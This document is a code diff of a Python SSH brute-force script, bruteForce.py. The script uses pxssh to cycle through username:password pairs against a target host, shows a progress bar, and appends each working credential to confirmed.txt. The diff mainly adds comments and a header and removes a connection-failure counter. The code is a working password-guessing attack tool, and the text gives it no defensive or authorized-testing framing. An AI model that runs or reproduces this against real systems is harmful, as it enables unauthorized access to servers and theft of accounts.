@@ -1,4 +1,10 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+Name: bruteForce.py
+Author: PiningNorwegianBlue
+Date: August 5th, 2019
+"""
 from pexpect import pxssh
 from threading import *
 import os
@@ -6,18 +12,14 @@ from time import sleep
 from tqdm import tqdm
 
 
-max_con = 5
-con_lock = Semaphore(value=max_con)
-
+con_lock = Semaphore(value=5)
 confirmed_credentials = False
-failed_connections = 0
 
 
 def login_ssh(host, cred):
     global confirmed_credentials
-    global failed_connections
     con_lock.acquire()
-
+    # Creating the progress bar
     pbar = tqdm(cred, ncols=75)
     for i in pbar:
         un = i.split(":")[0]
@@ -25,9 +27,10 @@ def login_ssh(host, cred):
         pbar.set_description("{:<30}".format(i))
         try:
             s = pxssh.pxssh()
-            if s.login(host, un, pw, sync_original_prompt=False):
+            if s.login(host, un, pw, sync_original_prompt=False):  # Attempting connection with username, password
                 confirmed_credentials = True
-                s.close()
+                s.close()  # Closing connection
+                # Appending credentials to confirmed.txt conditionally
                 try:
                     path = "./confirmed.txt"
                     mode = "a+" if os.path.exists(path) else os.mknod(path)
@@ -52,7 +55,6 @@ def login_ssh(host, cred):
                     print(e)
         except Exception as e:
             if "read_nonblocking" in str(e):
-                failed_connections += 1
                 sleep(0.5)
                 login_ssh(host, cred)
             if "synchronize with original prompt" in str(e):
